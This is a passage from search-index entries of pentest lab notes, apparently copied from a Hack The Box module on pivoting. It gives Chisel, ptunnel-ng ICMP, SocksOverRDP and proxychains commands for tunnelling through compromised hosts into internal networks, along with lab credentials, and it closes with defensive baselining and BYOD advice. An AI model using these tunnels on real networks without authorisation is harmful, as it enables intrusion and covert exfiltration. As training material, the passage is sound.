host.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#transferring-chisel-binary-to-pivot-host","title":"Transferring Chisel Binary to Pivot Host","text":"<p>Transferring Chisel Binary to Pivot Host</p> <pre><code>darkinga@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/\n\nubuntu@10.129.202.64's password: \nchisel                                        100%   11MB   1.2MB/s   00:09    \n</code></pre> <p>Then we can start the Chisel server/listener.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#running-the-chisel-server-on-the-pivot-host","title":"Running the Chisel Server on the Pivot Host","text":"<p>Running the Chisel Server on the Pivot Host</p> <pre><code>ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5\n\n2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=\n2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234\n</code></pre> <p>The Chisel listener will listen for incoming connections on port <code>1234</code> using SOCKS5 (<code>--socks5</code>) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.</p> <p>We can start a client on our attack host and connect to the Chisel server.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#connecting-to-the-chisel-server","title":"Connecting to the Chisel Server","text":"<p>Connecting to the Chisel Server</p> <pre><code>darkinga@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks\n\n2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234\n2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening\n2022/05/05 14:21:18 client: tun: Bound proxies\n2022/05/05 14:21:19 client: Handshaking...\n2022/05/05 14:21:19 client: Sending config\n2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)\n2022/05/05 14:21:19 client: tun: SSH connected\n</code></pre> <p>As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at <code>/etc/proxychains.conf</code> and add <code>1080</code> port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#editing-confirming-proxychainsconf","title":"Editing &amp; Confirming proxychains.conf","text":"<p>We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using <code>tail</code>.</p> <p>Editing &amp; Confirming proxychains.conf</p> <pre><code>darkinga@htb[/htb]$ tail -f /etc/proxychains.conf \n\n#\n#       proxy types: http, socks4, socks5\n#        ( auth types supported: \"basic\"-http  \"user/pass\"-socks )\n#\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n# socks4    127.0.0.1 9050\nsocks5 127.0.0.1 1080\n</code></pre> <p>Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#pivoting-to-the-dc","title":"Pivoting to the DC","text":"<p>Pivoting to the DC</p> <pre><code>darkinga@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#chisel-reverse-pivot","title":"Chisel Reverse Pivot","text":"<p>In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.</p> <p>When the Chisel server has <code>--reverse</code> enabled, remotes can be prefixed with <code>R</code> to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying <code>R:socks</code> will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.</p> <p>We'll start the server in our attack host with the option <code>--reverse</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-the-chisel-server-on-our-attack-host","title":"Starting the Chisel Server on our Attack Host","text":"<p>Starting the Chisel Server on our Attack Host</p> <pre><code>darkinga@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5\n\n2022/05/30 10:19:16 server: Reverse tunnelling enabled\n2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=\n2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234\n</code></pre> <p>Then we connect from the Ubuntu (pivot host) to our attack host, using the option <code>R:socks</code></p> <p>Starting the Chisel Server on our Attack Host</p> <pre><code>ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks\n\n2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234\n2022/05/30 14:19:29 client: Handshaking...\n2022/05/30 14:19:30 client: Sending config\n2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)\n2022/05/30 14:19:30 client: tun: SSH connected\n</code></pre> <p>We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using <code>tail</code>.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#editing-confirming-proxychainsconf_1","title":"Editing &amp; Confirming proxychains.conf","text":"<p>Editing &amp; Confirming proxychains.conf</p> <pre><code>darkinga@htb[/htb]$ tail -f /etc/proxychains.conf \n\n[ProxyList]\n# add proxy here ...\n# socks4    127.0.0.1 9050\nsocks5 127.0.0.1 1080 \n</code></pre> <p>If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p> <p>Editing &amp; Confirming proxychains.conf</p> <pre><code>darkinga@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#icmp-tunneling-with-socks","title":"ICMP Tunneling with SOCKS","text":"<p>ICMP tunneling encapsulates your traffic within <code>ICMP packets</code> containing <code>echo requests</code> and <code>responses</code>. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.</p> <p>We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the <code>ptunnel-ng client</code>. We can start the <code>ptunnel-ng server</code> on the target pivot host. Let's start by setting up ptunnel-ng.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#setting-up-using-ptunnel-ng","title":"Setting Up &amp; Using ptunnel-ng","text":"<p>If ptunnel-ng is not on our attack host, we can clone the project using git.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#cloning-ptunnel-ng","title":"Cloning Ptunnel-ng","text":"<p>Cloning Ptunnel-ng</p> <pre><code>darkinga@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git\n</code></pre> <p>Once the ptunnel-ng repo is cloned to our attack host, we can run the <code>autogen.sh</code> script located at the root of the ptunnel-ng directory.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#building-ptunnel-ng-with-autogensh","title":"Building Ptunnel-ng with Autogen.sh","text":"<p>Building Ptunnel-ng with Autogen.sh</p> <pre><code>darkinga@htb[/htb]$ sudo ./autogen.sh \n</code></pre> <p>After running authgen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the <code>-r</code> option with SCP.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#transferring-ptunnel-ng-to-the-pivot-host","title":"Transferring Ptunnel-ng to the Pivot Host","text":"<p>Transferring Ptunnel-ng to the Pivot Host</p> <pre><code>darkinga@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/\n</code></pre> <p>With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#starting-the-ptunnel-ng-server-on-the-target-host","title":"Starting the ptunnel-ng Server on the Target Host","text":"<p>Starting the ptunnel-ng Server on the Target Host</p> <pre><code>ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22\n\n[sudo] password for ubuntu: \n./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)\n[inf]: Starting ptunnel-ng 1.42.\n[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;\n[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;\n[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;\n[inf]: Forwarding incoming ping packets over TCP.\n[inf]: Ping proxy is listening in privileged mode.\n[inf]: Dropping privileges now.\n</code></pre> <p>The IP address following <code>-r</code> should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking &amp; consideration during an actual engagement.</p> <p>Back on the attack host, we can attempt to connect to the ptunnel-ng server (<code>-p &lt;ipAddressofTarget&gt;</code>) but ensure this happens through local port 2222 (<code>-l2222</code>). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#connecting-to-ptunnel-ng-server-from-attack-host","title":"Connecting to ptunnel-ng Server from Attack Host","text":"<p>Connecting to ptunnel-ng Server from Attack Host</p> <pre><code>darkinga@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22\n\n[inf]: Starting ptunnel-ng 1.42.\n[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;\n[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;\n[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;\n[inf]: Relaying packets from incoming TCP streams.\n</code></pre> <p>With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (<code>-p2222</code>).</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#tunneling-an-ssh-connection-through-an-icmp-tunnel","title":"Tunneling an SSH connection through an ICMP Tunnel","text":"<p>Tunneling an SSH connection through an ICMP Tunnel</p> <pre><code>darkinga@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1\n\nubuntu@127.0.0.1's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed 11 May 2022 03:10:15 PM UTC\n\n  System load:             0.0\n  Usage of /:              39.6% of 13.72GB\n  Memory usage:            37%\n  Swap usage:              0%\n  Processes:               183\n  Users logged in:         1\n  IPv4 address for ens192: 10.129.202.64\n  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb\n  IPv4 address for ens224: 172.16.5.129\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\n144 updates can be applied immediately.\n97 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\n\nLast login: Wed May 11 14:53:22 2022 from 10.10.14.18\nubuntu@WEB01:~$ \n</code></pre> <p>If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.</p> <p>On the client &amp; server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#viewing-tunnel-traffic-statistics","title":"Viewing Tunnel Traffic Statistics","text":"<p>Viewing Tunnel Traffic Statistics</p> <pre><code>inf]: Incoming tunnel request from 10.10.14.18.\n[inf]: Starting new session to 10.129.202.64:22 with ID 20199\n[inf]: Received session close from remote peer.\n[inf]: \nSession statistics:\n[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%\n[inf]: \n</code></pre> <p>We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#enabling-dynamic-port-forwarding-over-ssh","title":"Enabling Dynamic Port Forwarding over SSH","text":"<p>Enabling Dynamic Port Forwarding over SSH</p> <pre><code>darkinga@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1\n\nubuntu@127.0.0.1's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n&lt;snip&gt;\n</code></pre> <p>We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#proxychaining-through-the-icmp-tunnel","title":"Proxychaining through the ICMP Tunnel","text":"<p>Proxychaining through the ICMP Tunnel</p> <pre><code>darkinga@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389\n\nProxyChains-3.1 (http://proxychains.sf.net)\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:80-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-172.16.5.19:3389-&lt;&gt;&lt;&gt;-OK\nNmap scan report for 172.16.5.19\nHost is up (0.12s latency).\n\nPORT     STATE SERVICE       VERSION\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.78 seconds\n</code></pre>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#network-traffic-analysis-considerations","title":"Network Traffic Analysis Considerations","text":"<p>It is important that we confirm the tools we are using are performing as advertised and that we have set up &amp; are operating them properly. In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like <code>Wireshark</code>. Take a close look at the short clip below.</p> <p></p> <p>In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that <code>TCP</code> &amp; <code>SSHv2</code> traffic is captured.</p> <p>The command used in the clip: <code>ssh ubuntu@10.129.202.64</code></p> <p>In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.</p> <p>Command used in clip: <code>ssh -p2222 -lubuntu 127.0.0.1</code></p> <p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#double-pivots","title":"Double Pivots","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#rdp-and-socks-tunneling-with-socksoverrdp","title":"RDP and SOCKS Tunneling with SocksOverRDP","text":"<p>There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses <code>Dynamic Virtual Channels</code> (<code>DVC</code>) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use <code>SocksOverRDP</code> to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.</p> <p>We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:</p> <ol> <li>SocksOverRDP x64 Binaries</li> <li> <p>Proxifier Portable Binary</p> </li> <li> <p>We can look for <code>ProxifierPE.zip</code></p> </li> </ol> <p>We can then connect to the target using xfreerdp and copy the <code>SocksOverRDPx64.zip</code> file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#loading-socksoverrdpdll-using-regsvr32exe","title":"Loading SocksOverRDP.dll using regsvr32.exe","text":"<p>Loading SocksOverRDP.dll using regsvr32.exe</p> <pre><code>C:\\Users\\htb-student\\Desktop\\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll\n</code></pre> <p></p> <p>Now we can connect to 172.16.5.19 over RDP using <code>mstsc.exe</code>, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials <code>victor:pass@123</code> to connect to 172.16.5.19.</p> <p></p> <p>We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.</p> <p></p> <p>When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#confirming-the-socks-listener-is-started","title":"Confirming the SOCKS Listener is Started","text":"<p>Confirming the SOCKS Listener is Started</p> <pre><code>C:\\Users\\htb-student\\Desktop\\SocksOverRDP-x64&gt; netstat -antb | findstr 1080\n\n  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING\n</code></pre> <p>After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#configuring-proxifier","title":"Configuring Proxifier","text":"<p>With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p> <p></p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#rdp-performance-considerations","title":"RDP Performance Considerations","text":"<p>When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the <code>Experience</code> tab in mstsc.exe and set <code>Performance</code> to <code>Modem</code>.</p> <p></p> <p>Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#additional-considerations","title":"Additional Considerations","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#detection-prevention","title":"Detection &amp; Prevention","text":"<p>Throughout this module, we have mastered several different techniques that can be used from an <code>offensive perspective</code>. As penetration testers, we should also be concerned with the mitigations and detections that can be put in place to aid defenders in stopping these types of TTP's. This is crucial since we are expected to provide our customers with potential fixes or solutions to the issues we find and exploit during our assessments. Some may be:</p> <ul> <li>Physical hardware changes</li> <li>Changes to the network infrastructure</li> <li>Modifications to host baselines</li> </ul> <p>This section will cover some of these fixes and what they mean for us and those in charge of defending the network.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#setting-a-baseline","title":"Setting a Baseline","text":"<p>Understanding everything present and happening in a network environment is vital. As defenders, we should be able to quickly <code>identify</code> and <code>investigate</code> any new hosts that appear in our network, any new tools or applications that get installed on hosts outside of our application catalog, and any new or unique network traffic generated. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. Among some of the considerations we can start with are:</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#things-to-document-and-track","title":"Things to Document and Track","text":"<ul> <li>DNS records, network device backups, and DHCP configurations</li> <li>Full and current application inventory</li> <li>A list of all enterprise hosts and their location</li> <li>Users who have elevated permissions</li> <li>A list of any dual-homed hosts (More than one network interface)</li> <li>Keeping a visual network diagram of your environment</li> </ul> <p>Along with tracking the items above, keeping a visual network diagram of your environment up-to-date can be highly effective when troubleshooting issues or responding to an incident. Netbrain is an excellent example of one tool that can provide this functionality and interactive access to all appliances in the diagram. If we want a way to document our network environment visually, we can use a free tool like diagrams.net. Lastly, for our baseline, understanding what assets are critical to the operation of your organization and monitoring those assets is a must.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#people-processes-and-technology","title":"People, Processes, and Technology","text":"<p>Network hardening can be organized into the categories People, Process, and Technology. These hardening measures will encompass the hardware, software, and human aspects of any network. Let's start with the <code>human</code> (<code>People</code>) aspect.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#people","title":"People","text":"<p>In even the most hardened environment, users are often considered the weakest link. Enforcing security best practices for standard users and administrators will prevent \"easy wins\" for pentesters and malicious attackers. We should also strive to keep ourselves and the users we serve educated and aware of threats. The measures below are a great way to begin the process of securing the human element of any enterprise environment.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#byod-and-other-concerns","title":"BYOD and Other Concerns","text":"<p>Bring Your Own Device (BYOD) is becoming prevalent in today's workforce. With the increased acceptance of remote work and hybrid work arrangements, more people are using their personal devices to perform work-related tasks. This presents uniques risks to organizations because their employees may be connecting to networks and shared resources owned by the organization. The organization has a limited ability to administer and secure a personally owned device such as a laptop or smartphone, leaving the responsibility of securing the device largely with the owner. If the device owner follows poor security practices, they not only put themselves at risk of compromise, but now they can also extend these same risks to their employers. Consider the practical example below to build perspective on this:</p> <p>Scenario: Nick is a hardworking and dedicated logistics manager for Inlanefreight. He has put in a lot of great work over the years, and the company trusts him enough to allow him to work from home three days out of the week. Like many Inlanefreight employees, Nick also takes advantage of Inlanefreight's willingness to allow employees to use their own devices for work-related tasks at home and in the office network environments. Nick also enjoys gaming and sometimes illegally torrents video 